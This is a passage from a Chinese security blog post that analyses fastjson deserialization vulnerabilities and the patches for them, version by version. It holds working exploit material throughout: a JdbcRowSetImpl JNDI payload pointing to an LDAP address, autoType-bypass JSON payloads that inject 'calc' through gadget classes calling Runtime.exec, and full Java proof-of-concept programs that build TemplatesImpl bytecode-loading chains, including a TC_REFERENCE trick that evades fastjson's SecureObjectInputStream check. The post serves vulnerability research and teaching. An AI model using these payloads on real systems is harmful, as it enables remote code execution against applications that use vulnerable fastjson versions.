<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">		<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">		<span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">		<span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-32"><a href="#1-2-32" class="headerlink" title="1.2.32"></a>1.2.32</h3><p>1.2.32前需要关闭autotype才能执行，原因在于自1.2.33开始，当开启autotype之后，进行黑名单检测时如果检测到黑名单类并不会直接抛出异常，而是还会从mappings缓存中查找，如果都没有才会抛出异常</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023185727882.png" alt="image-20231023185727882"></p>
<p>而在1.2.32中没有该逻辑，如果匹配到黑名单则直接抛出异常</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023190033359.png" alt="image-20231023190033359"></p>
<h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson -1.2.68"></a>fastjson -1.2.68</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.68</p>
<p>autotype：均可</p>
<p>在1.2.47之后，官方把MiscCodec中调用loadClass的地方cache默认设为了false，并且TypeUtils的loadClass也默认设为了false，cache加载恶意类的方式便不再适用</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231024135921385.png" alt="image-20231024135921385"></p>
<p>在1.2.68中又提出了一个新的 autoType 绕过思路：利用 expectClass 绕过 <code>checkAutoType()</code>。</p>
<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以接下来就需要寻找哪里调用<code>checkAutoType()</code>，并且调用时有expectClass作为入参，最终找到了这两个类</p>
<ul>
<li><p><code>ThrowableDeserializer#deserialze()</code></p>
</li>
<li><p><code>JavaBeanDeserializer#deserialze()</code></p>
</li>
</ul>
<h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>expectClass入参为Throwable</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025151432003.png" alt="image-20231025151432003"></p>
<p>如果传入的类是Throwable的子类或者实现类，就可以绕过checkAutoType检测，获取class</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025152333512.png" alt="image-20231025152333512"></p>
<p>并且由于是Throwable的子类，在<code>getDeserializer()</code>获取反序列化器时，也能拿到ThrowableDeserialize反序列化器，最终出发对应的ThrowableDeserializer#deserialze()</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025152611523.png" alt="image-20231025152611523"></p>
<p>gadget</p>
<p>Exception是Throwable的子类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecException&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>在<code>getDeserializer()</code>获取反序列化器时，如果找不到合适的反序列化器,会调用最后的<code>createJavaBeanDeserializer()</code>，创建JavaBeanDeserializer进行反序列化</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153147913.png" alt="image-20231025153147913"></p>
<p>在TypeUtils#addBaseClassMappings(),发现白名单中有个AutoCloseable，经调试他会获取JavaBeanDeserializer反序列化器</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153311274.png" alt="image-20231025153311274"></p>
<p>而他的expectClass是可控的，就是在经过的ParserConfig#checkAutoType后得到的clazz值，而如果我们传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到的expectClass就是<code>java.lang.AutoCloseable</code></p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153904376.png" alt="image-20231025153904376"></p>
<p>所以就可以构造，实现java.lang.AutoCloseable接口的子类可以绕过autotype反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Closeable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecCloseable</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecCloseable</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecCloseable</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fastjson在后续版本中将java.lang.Runnable、java.lang.Readable加入了黑名单，经测试这些类也是可以触发的，不过像这种把命令执行写到异常类的处理方式未免有些鸡肋，在实际开发场景中一般不会碰见，并且自1.2.68开始由于加了这段代码，jndi等利用方式也不再适用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">        || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">        || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是浅蓝师傅提出了写文件拿shell方式，具体可参考</p>
<p><a href="https://su18.org/post/fastjson-1.2.68/">Fastjson 68 commons-io AutoCloseable </a></p>
<h2 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson -1.2.80"></a>fastjson -1.2.80</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.80</p>
<p>autotype：均可</p>
<p>1.2.69开始，将AutoCloseable以hash的形式又又又又加入了黑名单，如果使用AutoCloseable，expectClassFlag的值会变为false，若此时默认关闭autotype功能则无法加载继承AutoCloseable的恶意类，这条路便无法走通了</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025164310188.png" alt="image-20231025164310188"></p>
<p>但这次黑名单中并没有将Throwable加入黑名单，所以expectClass入参为Throwable的方式仍然可用，除此外更具突破性的应该是师傅们挖掘的对于特殊依赖的利用链</p>
<p>gadget:</p>
<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
<p><a href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf</a></p>
<p>1.2.83版本彻底将期望类ban掉了，并且在添加mapping缓存时也加了一层autotype判断</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025182245454.png" alt="image-20231025182245454"></p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025182400394.png" alt="image-20231025182400394"></p>
<ol>
<li><a href="https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d">https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d</a></li>
<li><a href="https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15">https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15</a></li>
</ol>
<p>通过parseObject()触发利用的方式得到了暂时的修复，但通过fastjson 原生反序列化仍存在相应的利用绕过方式</p>
<h1 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h1><h2 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson &lt; 1.2.49"></a>fastjson &lt; 1.2.49</h2><p>fastjson中有两个类实现了Serializable接口，分别是<code>JSONArray</code>和<code>JSONObject</code>，并且他们都继承于JSON类</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231026114131702.png" alt="image-20231026114131702"></p>
<p>而在JSON类中，有一个toString方法，会调用toJSONString()，toJSONString()又会调用指定类的getter方法</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231026114410826.png" alt="image-20231026114410826"></p>
<p>但fastjson组件中没有重写<code>readObject()</code>，所以就要借助其它类的readObject类进行拼接，调用toString直接可以想到现有的链BadAttributeValueExpException，整条调用链也就出来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject() —&gt; </span><br><span class="line">JSON.toString() —&gt;  </span><br><span class="line">TemplatesImpl.getOutputProperties() —&gt;  </span><br></pre></td></tr></table></figure>

<p>POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDeser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;S1nJa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray= <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serilize = serilize(badAttributeValueExpException);</span><br><span class="line">        unserilize(serilize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serilize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o, String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Exec.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-≥-1-2-49"><a href="#fastjson-≥-1-2-49" class="headerlink" title="fastjson ≥ 1.2.49"></a>fastjson ≥ 1.2.49</h2><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>自1.2.49开始，fastjson实现了自己的<code>readObject()</code>类，它定义了<code>SecureObjectInputStream()</code>方法</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027110540708.png" alt="image-20231027110540708"></p>
<p>封装完secIn对象后，会调用到<code>secIn.defaultReadObject();</code>，会走到JSON类重写的<code>resolveClass()</code>方法，调用<code>checkAutoType()</code>方法进行黑名单检测，所以Templates加载字节码的方式就会被check掉</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027111426348.png" alt="image-20231027111426348"></p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>但这种方式并不是安全的，因为这里的反序列化过程是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject -&gt; SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>

<p>相当于在ObjectInputStream套了个SecureObjectInputStream进行检测</p>
<p>而正常流程应该是生成一个继承ObjectInputStream的类并重写resolveClass，由它来做反序列化的入口，这样才是安全的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">继承类 -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>

<p>既然这样，就需要考虑如何绕过<code>resolveClass()</code>解析，了解反序列化流程的话应该知道</p>
<p><code>readObject0()</code>的switch语句中，会走到<code>TC_OBJECT</code>处理对象，调用<code>readOrdinaryObject()</code>，其中会调用<code>readClassDesc()</code>读取类描述符，最后调用<code>readNonProxyDesc()</code>，调用到<code>resolveClass()</code>，具体流程可以参考之前文章<a href="https://s1nja.github.io/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/">defaultReadObject分析 | S1nJa’s Blog</a></p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027114826853.png" alt="image-20231027114826853"></p>
<p>所以想要不执行<code>resolveClass</code>就要考虑如何才能不执行<code>readClassDesc()</code>，而<code>switch</code>语句中有这么几个分支不会走到该方法<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code></p>
<p>其中TC_REFERENCE是引用类型，如果一个对象被多次引用，那么只会在第一次出现时进行完整地反序列化，而后面的引用将使用 TC_REFERENCE 进行标记</p>
<p>因此在调用时，往List、set、map类型中添加同样对象即可成功利用，即：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//List</span></span><br><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//set</span></span><br><span class="line">Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//map</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(templates,badAttributeValueExpException);</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDeser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;S1nJa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(templates);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray= <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        set.add(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] serilize = serilize(set);</span><br><span class="line">        unserilize(serilize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serilize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o, String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Exec.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
</search>
